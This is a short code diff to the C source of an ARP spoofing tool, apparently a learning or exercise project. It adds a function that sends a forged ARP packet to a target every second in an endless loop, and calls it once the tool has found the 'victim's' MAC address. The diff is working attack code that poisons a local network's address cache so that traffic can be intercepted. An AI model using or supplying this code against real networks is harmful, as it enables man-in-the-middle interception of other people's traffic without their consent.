@@ -6,7 +6,18 @@
 */
 
 #include <stdio.h>
+#include <unistd.h>
 #include "my_arp_spoof.h"
+
+static void spoof(sock_t *sock, arg_t *arg, uint8_t *pack, size_t size)
+{
+    while (1) {
+        printf("Spoofed packet sent to '%s'\n", arg->dest_ip);
+        sendto(sock->fd, pack, size, 0, (struct sockaddr *)&(sock->dest_arp),
+        sizeof(struct sockaddr_ll));
+        sleep(1);
+    }
+}
 
 static void execute(sock_t *sock, arg_t *arg)
 {
@@ -27,6 +38,7 @@ static void execute(sock_t *sock, arg_t *arg)
     }
     printf("Found victim's MAC address: '%02X:%02X:%02X:%02X:%02X:%02X'\n",
     buf[0], buf[1], buf[2], buf[3], buf[4], buf[5]);
+    spoof(sock, arg, packet, tmp);
 }
 
 int main(int ac, char **av)
